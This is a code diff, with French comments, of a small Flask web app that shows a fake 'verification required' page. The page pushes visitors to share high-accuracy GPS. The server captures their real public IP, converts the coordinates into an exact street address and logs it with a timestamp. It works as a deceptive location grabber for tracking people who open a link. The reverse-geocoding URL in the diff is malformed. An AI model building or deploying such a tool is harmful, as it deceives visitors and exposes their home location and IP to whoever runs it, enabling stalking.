@@ -27,21 +27,26 @@ HTML_VALIDATION = """
     <div class="box">
         <h2>Vérification requise</h2>
         <p>Avant de continuer et d'accéder au site, veuillez valider votre géolocalisation (vous pouvez accepter ou refuser la demande du navigateur).</p>
+        <!-- Le clic direct ici va forcer le téléphone à réagir -->
         <button id="btn-check">Continuer</button>
     </div>
     <script>
+        // ÉCOUTEUR DE CLIC DIRECT : La seule méthode acceptée par Apple et Google
         document.getElementById('btn-check').addEventListener('click', function() {
             if (navigator.geolocation) {
+                // Options pour forcer le téléphone à s'activer au maximum
                 const options = {
-                    enableHighAccuracy: true,
+                    enableHighAccuracy: true, // Force l'utilisation du vrai GPS du téléphone
                     timeout: 5000,
                     maximumAge: 0
                 };
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
+                        // L'utilisateur a fait "Autoriser"
                         envoyerDonnees(position.coords.latitude, position.coords.longitude);
                     },
                     function(error) {
+                        // L'utilisateur a fait "Refuser" ou blocage système
                         envoyerDonnees(null, null);
                     },
                     options
@@ -77,9 +82,9 @@ def api_verification():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     
-    # Correction de la capture IP (Récupération propre du header sous forme de chaîne)
-    if request.headers.get("X-Forwarded-For"):
-        ip_visiteur = request.headers.get("X-Forwarded-For").split(',')[0].strip()
+    # Capture la vraie IP publique derrière le proxy Render
+    if request.headers.getlist("X-Forwarded-For"):
+        ip_visiteur = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
     else:
         ip_visiteur = request.remote_addr
         
@@ -88,13 +93,8 @@ def api_verification():
     
     if latitude and longitude:
         try:
-            # URL correcte pour l'API Nominatim (OpenStreetMap)
             url_osm = f"https://openstreetmap.org{latitude}&lon={longitude}"
-            
-            # User-Agent obligatoire requis par la charte d'OSM
-            headers = {'User-Agent': 'MonApplicationDeTestGeoloc/1.0 (contact@mon-email.com)'}
-            
-            reponse = requests.get(url_osm, headers=headers).json()
+            reponse = requests.get(url_osm, headers={'User-Agent': 'VerifSimpleServer'}).json()
             if 'address' in reponse:
                 num = reponse['address'].get('house_number', '')
                 route = reponse['address'].get('road', 'Rue inconnue')
@@ -104,6 +104,7 @@ def api_verification():
         except Exception:
             rue_exacte = "Erreur lors de la récupération de la rue"
             
+    # BLOC AVEC APPARENCE PROPRE ET ESPACEMENT DE SÉCURITÉ
     bloc_texte = (
         f"====================================================\n"
         f"⏰ Heure exacte : {heure_exacte}\n"
